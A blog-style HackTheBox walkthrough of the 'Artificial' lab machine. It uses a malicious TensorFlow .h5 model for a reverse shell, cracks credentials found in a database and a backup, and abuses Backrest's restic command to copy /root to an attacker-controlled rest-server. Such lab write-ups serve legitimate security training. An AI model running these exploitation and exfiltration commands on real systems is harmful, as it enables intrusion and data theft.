---
title: " HackTheBox Artificial Writeup"
date: 2025-09-29
categories: [HTB, Machines]
tags: [Linux, CVE, restic, snapshots]
image:
  path: /assets/Artificial-htb/1.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: "Artificial HTB — blog writeup cover"
---

## Nmap Scan

I started by running a full TCP scan on the target using:
```shell
sudo nmap 10.10.11.74 -T4 -A -open -p-
```
![nmap](/assets/Artificial-htb/nmap-scan-Artificial.png)
I mapped the domain to the IP in ```/etc/hosts``` and discovered a file upload feature accepting only ```.h5``` files, commonly used for TensorFlow models.
![upload](/assets/Artificial-htb/upload.png)
Research uncovered a TensorFlow CVE enabling RCE via ```.h5``` files. Key resources:
- [TensorFlow RCE Research ](https://mastersplinter.work/research/tensorflow-rce/)
- [PoC Demo](https://github.com/Splinter0/tensorflow-rce?tab=readme-ov-file)

## TensorFlow Remote Code Execution with Malicious Model

![docker](/assets/Artificial-htb/docker.png)
To match the server’s environment ```(python:3.8, tensorflow==2.13.1)```, I used Docker to avoid ```load_model()``` issues due to version mismatches. I built the image:
```shell
sudo docker build -t artificial-exploit .
```
I ran the container, mounting the current directory to ```/app``` for file transfer:
```shell
sudo docker run -it -v $(pwd):/app artificial-exploit
```
Using the provided ```exploit.py``` script (modified with my IP ```10.10.16.40``` for the reverse shell), I generated exploit.h5:
![h5](/assets/Artificial-htb/h5.png)
I generated the ```exploit.h5``` file using:
```shell
python3 exploit.py
```
![exploit](/assets/Artificial-htb/exploit.png)
I uploaded exploit.h5 to the server 
![model](/assets/Artificial-htb/model.png)
and set up a listener:
```shell
nc -nvlp 6666
```
This granted a reverse shell.
![nc](/assets/Artificial-htb/nc.png)

## User.txt


For better functionality, I spawned a fully interactive TTY:
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
I found a ```users.db``` SQLite database and queried it:
![creds](/assets/Artificial-htb/creds.png)
This revealed user credentials, including hashed passwords. I cracked the hash for ``gael`` yielding:
![crack](/assets/Artificial-htb/crack.png)
```shell
gael:mattp005numbertwo
```
After cracking the password for the user ```gael```, I switched to their account:
![su](/assets/Artificial-htb/su.png)

successfully gaining access to the gael user account.

> Persistent SSH Access
{: .prompt-tip }
To enable easier file transfers and persistent access, I generated an ```ed25519 key pair``` on my Kali machine for security and efficiency:
```shell
ssh-keygen -t ed25519 -C "you@youremail" -f ~/.ssh/id_ed25519
```
I copied the public key to the server:
```shell
ssh-copy-id -i ~/.ssh/id_ed25519.pub gael@10.10.11.74
```
Then connected via SSH:
```shell
ssh -i ~/.ssh/id_ed25519 gael@10.10.11.74
```
![ssh](/assets/Artificial-htb/ssh.png)

## Backrest_root's Credits

I transferred and executed ```linpeas.sh``` to enumerate the system for privilege escalation vectors. While Linux check scripts can be used, ```linpeas.sh``` is faster and more comprehensive.
![linpease](/assets/Artificial-htb/linpease.png)
linpeas.sh pointed me to ```/var/backups```, where I found ```backrest_backup.tar.gz```, a backup file containing critical data.<br>
![backup](/assets/Artificial-htb/backup.png)
![backup2](/assets/Artificial-htb/backup2.png)
I transferred ```backrest_backup.tar.gz``` to my machine, extracted it, and found a ```config.json``` file:
![backup3](/assets/Artificial-htb/backup3.png)
![config](/assets/Artificial-htb/config.png)
The ```config.json``` contained a Base64-encoded bcrypt hash for the ```backrest_root``` service account:
```shell
{
  "name": "backrest_root",
  "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
}
```
I decoded the Base64 string to extract the bcrypt hash:
```shell
echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d

Output:

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```
I used hashcat to crack the hash with the ```rockyou.txt``` wordlist:
```shell
hashcat -m 3200 hash.hash ../rockyou.txt --force
```
![hash](/assets/Artificial-htb/hash.png)
This revealed the password for ```backrest_root```:
```shell
backrest_root:!@#$%^
```

## Root.txt

![backr](/assets/Artificial-htb/backr.png)

Backrest, a web service executing system commands with root privileges, allows command injection via its interface (e.g., "Run Command" tab).<br>
According to GTFOBins, restic running with sudo can read or transfer sensitive files, such as those in ```/root```, when executed with elevated privileges.
![restic](/assets/Artificial-htb/restic.png)

I set up a ```rest-server``` on my attacker machine to receive backup data:
```shell
rest-server --path /tmp/restic-data --listen :12345 --no-auth 
```
![attack](/assets/Artificial-htb/attack.png)
This server stores data locally in /tmp/restic-data.

On the target’s Backrest interface ```(Run Command tab)```, I executed restic commands. Since Backrest prepends the binary ```/opt/backrest/restic```, I only provided the arguments.
- Initialize a repository:  
![repo](/assets/Artificial-htb/repo.png)
```shell
-r rest:http://<ATTACKER_IP>:12345/exploit init
```
![s1](/assets/Artificial-htb/s1.png)
- Back up the ```/root``` directory:
```shell
-r rest:http://<ATTACKER_IP>:12345/exploit backup /root
```
![s2](/assets/Artificial-htb/s2.png)
- On my attacker machine, I used restic to view snapshots and restore the ```backed-up``` data:
```shell
restic -r /tmp/restic-data/exploit snapshots
restic -r /tmp/restic-data/exploit restore <snapshot-id> --target ./restore
cat ./restore/root/root.txt
```
![attack](/assets/Artificial-htb/attack.png)
![root](/assets/Artificial-htb/root.png)
This successfully retrieved the ```root.txt``` file.